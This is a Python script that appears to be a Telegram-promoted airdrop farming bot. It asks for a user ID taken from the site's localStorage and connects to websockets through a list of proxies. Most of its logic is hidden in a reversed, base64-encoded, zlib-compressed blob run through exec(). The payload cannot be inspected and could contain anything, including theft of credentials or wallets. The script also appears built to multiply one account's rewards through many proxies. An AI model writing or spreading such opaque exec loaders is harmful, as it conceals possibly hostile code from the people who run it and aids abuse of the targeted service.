


_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'='))
banner_1 = (f"""{Fore.WHITE}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⢀⣀⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠀
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠀⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠁⠀⠀⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁  {Style.RESET_ALL}{Fore.RED}LISENSI SALAH KONTOL{Style.RESET_ALL}
 """)

# Python obfuscation by freecodingtools.org
                    
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))

def print_banner() -> None:
    print(f"""{Fore.RED}
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣻⣷⣒⣺⣿⣿⣿⣿⣿⣿⠿⠛⠛⠛⢿⠛⢿⣿⡟⢻⡿⠛⢻⣿⡿⠟⠛⠛⠻⢿⣿⣿⡿⠛⠛⠛⠿⣿⣿⡿⠟⠛⠛⠿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⠏⠁⣿⣿⣿⣿⣿⣿⣿⣿⠃⢠⣾⣿⣿⣦⠀⢸⣿⡇⠀⣴⣿⣿⣿⣀⣾⣿⣿⣦⠈⣿⣿⠀⢾⣿⣷⣤⣽⣿⠁⢼⣿⣿⣦⣼⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠿⡇⢠⢿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⠀⢸⣿⡇⢰⣿⣿⣿⣿⠟⢉⣭⣭⣅⠀⣿⣿⣦⣄⣉⡉⠙⢿⣿⣧⣤⣈⣉⠙⢿⣿⣿{Style.RESET_ALL}{Fore.WHITE}
⣿⣿⣿⣿⣿⣿⣿⠁⠀⣧⠃⢸⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡄⠘⢿⣿⣿⠟⠀⢸⣿⡇⢸⣿⣿⣿⣯⠀⢿⣿⣿⠏⠀⣿⣿⠙⢿⣿⣿⠂⢸⣿⠉⢻⣿⣿⠇⢸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⢠⡇⠀⢸⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣤⣤⣶⠀⢸⣿⣧⣼⣿⣿⣿⣿⣦⣤⣤⣤⣾⣤⣿⣿⣷⣤⣤⣤⣴⣿⣿⣷⣤⣤⣤⣴⣿⣿⣿
⣿⣿⣿⣿⡏⠀⢸⡴⢋⡇⠀⢸⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠋⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣗⣲⣿⣴⣾⣷⣄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ {Style.RESET_ALL}
    """)
    print(f"{Fore.CYAN}============================================================{Style.RESET_ALL}")
    print(f"{Fore.WHITE}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{Style.RESET_ALL}{Fore.YELLOW} Archdrop | t.me/archdrop {Style.RESET_ALL}{Fore.WHITE}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{Style.RESET_ALL}")
    print(f"{Fore.WHITE}⣿⣿  KALO NGEBOT GAUSAH BANYAK BACOT TENTANG RESIKO NGNTT  ⣿⣿{Style.RESET_ALL}")
    print(f"{Fore.CYAN}============================================================{Style.RESET_ALL}")

async def main():
    print_banner()
    #find user_id on the site in conlose localStorage.getItem('userId') (if you can't get it, write allow pasting)
    _user_id = input('Please Enter your user ID: ')
    with open('local_proxies.txt', 'r') as file:
            local_proxies = file.read().splitlines()
    tasks = [asyncio.ensure_future(connect_to_wss(i, _user_id)) for i in local_proxies]
    await asyncio.gather(*tasks)

if __name__ == '__main__':
    #letsgo
    asyncio.run(main())
# Python obfuscation by freecodingtools.org

